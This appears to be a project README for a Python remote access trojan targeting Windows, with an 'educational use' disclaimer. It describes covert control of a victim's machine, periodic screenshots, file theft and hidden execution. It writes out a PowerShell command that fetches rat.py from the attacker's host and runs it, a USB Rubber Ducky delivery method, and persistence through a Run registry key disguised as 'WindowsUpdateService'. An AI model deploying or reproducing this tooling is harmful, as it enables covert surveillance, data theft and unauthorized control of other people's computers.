🕵️ RAT - Remote Administration Toolkit
<div align="center">
https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python
https://img.shields.io/badge/Windows-Target-0078D6?style=for-the-badge&logo=windows
https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux
https://img.shields.io/badge/License-Educational-red?style=for-the-badge

A stealthy, multi-featured Remote Administration Tool for Windows systems

Features • Installation • Usage • Commands • Disclaimer

</div>
🚨 IMPORTANT LEGAL NOTICE
<details> <summary><b>⚠️ Click to read the full disclaimer</b></summary>
This tool is developed SOLELY for:

✅ Educational purposes

✅ Authorized security testing

✅ Penetration testing with written permission

✅ CTF competitions and lab environments

You MUST NOT use this tool on:

❌ Any system you don't own

❌ Without explicit written permission

❌ For any malicious purposes

❌ To violate any laws or regulations

The author assumes NO responsibility for:

Misuse of this software

Any damage caused by improper use

Legal consequences of unauthorized access

By using this tool, you agree to:

Use it responsibly and legally

Accept full liability for your actions

Not hold the author responsible for misuse

</details>
🌟 Features at a Glance
<div align="center">
Feature	Description	Status
🖥️ Command Execution	Run any Windows command remotely	✅
📸 Auto Screenshots	Captures every 15 seconds	✅
🎯 Manual Screenshots	On-demand capture via ss	✅
📁 File Download	Steal files from target system	✅
🔄 Persistence	Survives system reboots	✅
🙈 Stealth Mode	No console windows visible	✅
📶 Auto-Reconnect	Survives connection drops	✅
🧵 Multi-Threaded	Async operations	✅
</div>
📊 Architecture Overview









🚀 Quick Start
📦 Prerequisites
bash
# Kali Linux (Control Server)
sudo apt update
sudo apt install python3 python3-pip

# Windows Target (Client)
# Requires Python 3.x installed
pip install pyautogui pillow
⚙️ Configuration
1. Set your Kali IP address in both files:

In rat.py and code.py:

python
KALI_IP = "192.168.1.100"  # 🔴 CHANGE THIS TO YOUR IP
2. (Optional) Customize settings:

python
# rat.py
KALI_PORT = 4444                    # Change listening port
SCREENSHOT_INTERVAL = 15            # Seconds between screenshots

# kali_control.py
SAVE_FOLDER = "screenshots"         # Screenshot save location
🎮 Usage Guide
Step 1: Start the Control Panel
bash
python3 kali_control.py
<details> <summary><b>📸 Expected Output</b></summary>
bash
==================================================
  🎯 RAT Control Panel Active
  📁 Screenshots saved to: screenshots/
==================================================

[*] 🚀 Listening on 0.0.0.0:4444
[*] ⏳ Waiting for victim connection...
</details>
Step 2: Deploy the Payload
Choose your deployment method:

<details> <summary><b>🤖 Method 1: USB Rubber Ducky (code.py)</b></summary>
python
# Upload code.py to your USB HID device
# It will automatically:
# 1. Open Run (Win + R)
# 2. Launch PowerShell
# 3. Download and execute rat.py
# 4. Establish persistence
</details><details> <summary><b>💻 Method 2: Manual PowerShell</b></summary>
powershell
# Run this on the target Windows system:
mkdir -Force C:\Temp\RAT
cd C:\Temp\RAT
Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8080/rat.py" -OutFile rat.py
pythonw.exe rat.py
</details>
Step 3: Control the Target
text
[*] ✅ CONNECTION ESTABLISHED!
[*] 📍 IP: 192.168.1.50:49152

Command> whoami
✅ RAT ONLINE - DESKTOP-ABC - johndoe

Command> ipconfig
📡 Windows IP Configuration
   IPv4 Address: 192.168.1.50
   ...

Command> ss
📸 Screenshot captured and saved!

Command> download C:\Users\johndoe\Desktop\secret.docx
📁 File downloaded successfully! (45.2 KB)

Command> exit
👋 Closing connection...
📋 Complete Command Reference
Command	Syntax	Description	Example
System Info	whoami	Current username	whoami
Network	ipconfig	Network configuration	ipconfig
System Details	systeminfo	Full system information	systeminfo
List Files	dir or ls	List current directory	dir
Change Directory	cd <path>	Navigate folders	cd C:\Users
Manual Screenshot	ss	Capture screenshot now	ss
Download File	download <file>	Download remote file	download C:\flag.txt
Custom Command	<any command>	Execute any Windows command	netstat -an
Disconnect	exit or quit	Close connection	exit
🛡️ Advanced Features
🔒 Persistence Mechanism
registry
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Key: WindowsUpdateService
Value: "pythonw.exe C:\Temp\RAT\rat.py"
The RAT automatically:

✅ Adds itself to Windows startup

✅ Survives system reboots

✅ Runs hidden (no console window)

📸 Screenshot System
Automatic: Captures every 15 seconds

Manual: On-demand via ss command

Optimized: JPEG quality 20% for fast transfer

Organized: Auto-named with timestamps

📁 File Structure
text
rat-project/
├── 📄 rat.py                 # Client payload
├── 📄 kali_control.py        # Control panel
├── 📄 code.py                # Deployment script
├── 📁 screenshots/           # Captured screenshots
│   ├── 🖼️ screenshot_2024-01-15_14-25-30.jpg
│   └── 🖼️ screenshot_2024-01-15_14-40-45.jpg
└── 📄 README.md
🔧 Technical Details
Protocol
text
[MARKER: 1 byte] [LENGTH: 4 bytes] [DATA: variable]
Markers:

\x01 - Text output / Command response

\x02 - Screenshot image

\x03 - File download

Architecture
python
┌─────────────────────────────────────────────┐
│           RAT Client (Windows)              │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │   Main Thread                       │    │
│  │   - Receive commands               │    │
│  │   - Execute commands               │    │
│  │   - Send responses                 │    │
│  └─────────────────────────────────────┘    │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │   Screenshot Thread (Background)    │    │
│  │   - Captures every 15 seconds       │    │
│  │   - Sends asynchronously            │    │
│  └─────────────────────────────────────┘    │
│                                             │
└─────────────────────────────────────────────┘
                    │
                    │ TCP (Port 4444)
                    ▼
┌─────────────────────────────────────────────┐
│           Control Panel (Kali)              │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │   Main Thread                       │    │
│  │   - User interface                  │    │
│  │   - Sends commands                 │    │
│  │   - Displays responses             │    │
│  └─────────────────────────────────────┘    │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │   Receiver Thread (Background)      │    │
│  │   - Receives data                  │    │
│  │   - Saves files/screenshots        │    │
│  │   - Queues responses               │    │
│  └─────────────────────────────────────┘    │
│                                             │
└─────────────────────────────────────────────┘
🔍 Troubleshooting Guide
<details> <summary><b>🔄 Connection Issues</b></summary>
Firewall blocking? Add exception: sudo ufw allow 4444

Wrong IP? Verify KALI_IP in both files matches your Kali IP

Network isolation? Ensure both systems are on same network

Python not found? Install Python on target system

</details><details> <summary><b>📸 Screenshot Not Saving</b></summary>
Check write permissions in current directory

Verify pyautogui is installed: pip install pyautogui pillow

Ensure the screenshots/ folder is created automatically

</details><details> <summary><b>🔌 Connection Drops</b></summary>
RAT auto-reconnects every 5 seconds

Check network stability

Verify Kali machine is still running

Ensure port 4444 is not in use by another process

</details>
🛠️ Customization Tips
Change Screenshot Quality
python
# In rat.py, line ~18
ss.save(buf, format="JPEG", quality=50)  # 0-100 (higher = better)
Change Port
python
# In both files
KALI_PORT = 1337  # Your custom port
Modify Screenshot Interval
python
# In rat.py
SCREENSHOT_INTERVAL = 30  # Seconds between captures
Add New Features
python
# In rat.py, add new command handlers:
elif cmd == 'custom':
    # Your custom code here
    result = "Custom command executed!"
    s.send(b'\x01' + struct.pack('>I', len(result)) + result.encode())
📚 Learning Resources
Python Socket Programming

Windows Command Line Reference

PyAutoGUI Documentation

Ethical Hacking Certifications

🤝 Contributing
Contributions are welcome! Please follow these guidelines:

🍴 Fork the repository

🔧 Create a feature branch

📝 Write clean, documented code

✅ Test thoroughly

🔄 Submit a pull request

Guidelines:

Keep code compatible with Python 3.x

Maintain backward compatibility

Document new features

Test on both Windows and Kali

📝 License & Ethics
<div align="center">
This project is strictly for educational purposes.

Do ✅	Don't ❌
Learn about security	Use maliciously
Test on your own systems	Attack others
Participate in CTFs	Violate laws
Improve security awareness	Cause damage
</div>
⭐ Support the Project
If you find this project useful for learning:

⭐ Star the repository

🐛 Report issues

🔧 Submit fixes

📚 Share with fellow security enthusiasts

🔗 Quick Links
Report Bug

Request Feature

Documentation

Examples

<div align="center">
Made with ❤️ for Security Education

Remember: With great power comes great responsibility.

⬆ Back to Top

</div>
